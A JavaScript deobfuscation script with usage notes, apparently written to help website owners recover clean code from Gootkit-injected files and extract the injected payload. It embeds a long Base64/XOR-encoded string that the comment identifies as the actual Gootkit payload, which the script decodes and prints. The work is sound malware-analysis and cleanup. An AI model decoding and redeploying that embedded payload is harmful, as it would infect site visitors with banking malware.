/**
	de_goot.js

	This isn't complete, but useful enough.  If you have a gootkit-ed javascript file you can use the two functions
	below in rhino or the like to regain your original js.  Not sure if there's a best way to tell if it's gootkit
	or not, but so far if you find the string "getTopHost" I'd guess you have a winner.  Surprising they'd put that
	obvious of a string in there, but oh well.

	You need to know the domain of the victim website, but if you have the borked file chances are good you know
	if not own/control the site.

	So, let's say your (victim) website was at http://foo.example.com.

	Step 1: copy the borked js into http://jsbeautifier.org/
			- I think the default options are fine
	
	Step 2: scroll to the bottom of the js-beautifier results, where you should see something like the following
			(mind the 1's and 2's):

			var <randomVarName1> = new <randomFuncName1>("<uglyLongString1>");
			var <randomVarName2> = new <randomFuncName1>("<uglyLongString2>");
			if (typeof _typeof_ != "undefined") {
				<randomVarName1>.<randomFuncName2>()
			} else {
				eval(randomVarName2.randomFuncName2());
				eval(randomVarName1.randomFuncName2());
			};
	
	Step 3: find the "uglyString" var in this file, below the decode function definition.  replace its
			contents with your "<uglyLongString1>" (the initial long value there is the gootkit payload
			encoded with "example.com").

	Step 4: run the following at your shell (will write to stdout):

			$ rhino de_goot.js example.com

		alternately, start up rhino:

			$ rhino

		...copy in the two functions below (de64 and decode), and then run:

			js> decode("example.com", de64("<uglyLongString1>"));
	
	
	In this example, uglyLongString1 should decode to your clean javascript; uglyLongString2 should decode 
	to the gootkit payload.  The first two lines will contain the following comment:

		//Congratulations! you have successfully extracted the gootkit payload 
		//this means i must work hardly :( 

	The "uglyString" var below is the gootkit payload encoded with "example.com", so the following command
	on this file unchanged will yield the decoded payload:

		$ rhino de_goot.js example.com
	
	When I have time in the future and think of it enough to make it a priority (which will almost certainly
	be never), I'll make this a runnable script that takes the domain and uglyLongString as arguments or
	some such.

**/

/**
*
*  Base64 encode / decode
*  http://www.webtoolkit.info/javascript-base64.html, but with utf8 stuff removed as it
		breakse the xor_crypt algorithm
*
*  Run through obfuscator at http://javascriptobfuscator.com to save space -jfouse
*
**/

var _0xfae2=["\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x5F\x6B\x65\x79\x53\x74\x72","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x70\x6C\x61\x63\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"];var Base64={_keyStr:_0xfae2[0],encode:function (_0xf10ex2){var _0xf10ex3=_0xfae2[1];var _0xf10ex4,_0xf10ex5,_0xf10ex6,_0xf10ex7,_0xf10ex8,_0xf10ex9,_0xf10exa;var _0xf10exb=0;while(_0xf10exb<_0xf10ex2[_0xfae2[5]]){_0xf10ex4=_0xf10ex2[_0xfae2[2]](_0xf10exb++);_0xf10ex5=_0xf10ex2[_0xfae2[2]](_0xf10exb++);_0xf10ex6=_0xf10ex2[_0xfae2[2]](_0xf10exb++);_0xf10ex7=_0xf10ex4>>2;_0xf10ex8=((_0xf10ex4&3)<<4)|(_0xf10ex5>>4);_0xf10ex9=((_0xf10ex5&15)<<2)|(_0xf10ex6>>6);_0xf10exa=_0xf10ex6&63;if(isNaN(_0xf10ex5)){_0xf10ex9=_0xf10exa=64;} else {if(isNaN(_0xf10ex6)){_0xf10exa=64;} ;} ;_0xf10ex3=_0xf10ex3+this[_0xfae2[4]][_0xfae2[3]](_0xf10ex7)+this[_0xfae2[4]][_0xfae2[3]](_0xf10ex8)+this[_0xfae2[4]][_0xfae2[3]](_0xf10ex9)+this[_0xfae2[4]][_0xfae2[3]](_0xf10exa);} ;return _0xf10ex3;} ,decode:function (_0xf10ex2){var _0xf10ex3=_0xfae2[1];var _0xf10ex4,_0xf10ex5,_0xf10ex6;var _0xf10ex7,_0xf10ex8,_0xf10ex9,_0xf10exa;var _0xf10exb=0;_0xf10ex2=_0xf10ex2[_0xfae2[6]](/[^A-Za-z0-9\+\/\=]/g,_0xfae2[1]);while(_0xf10exb<_0xf10ex2[_0xfae2[5]]){_0xf10ex7=this[_0xfae2[4]][_0xfae2[7]](_0xf10ex2[_0xfae2[3]](_0xf10exb++));_0xf10ex8=this[_0xfae2[4]][_0xfae2[7]](_0xf10ex2[_0xfae2[3]](_0xf10exb++));_0xf10ex9=this[_0xfae2[4]][_0xfae2[7]](_0xf10ex2[_0xfae2[3]](_0xf10exb++));_0xf10exa=this[_0xfae2[4]][_0xfae2[7]](_0xf10ex2[_0xfae2[3]](_0xf10exb++));_0xf10ex4=(_0xf10ex7<<2)|(_0xf10ex8>>4);_0xf10ex5=((_0xf10ex8&15)<<4)|(_0xf10ex9>>2);_0xf10ex6=((_0xf10ex9&3)<<6)|_0xf10exa;_0xf10ex3=_0xf10ex3+String[_0xfae2[8]](_0xf10ex4);if(_0xf10ex9!=64){_0xf10ex3=_0xf10ex3+String[_0xfae2[8]](_0xf10ex5);} ;if(_0xf10exa!=64){_0xf10ex3=_0xf10ex3+String[_0xfae2[8]](_0xf10ex6);} ;} ;return _0xf10ex3;} };
 
function xor_crypt(a, b) {		// key, crypt
    var c = '';
	print("b.length: "+b.length);
	for (var i = 0; i < b.length; i++) {
		c += String.fromCharCode(a.charCodeAt(i % a.length) ^ b.charCodeAt(i))
	}
	return c
};

var key = arguments[0];
var uglyString = "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";

/*	 two-way proof
var try1 = "foodeblah";
print(try1);

var midway = Base64.encode(xor_crypt(key, try1));
print(midway);

var result = xor_crypt(key, Base64.decode(midway));
print(result);
*/

var result = xor_crypt(key, Base64.decode(uglyString));
print(result);
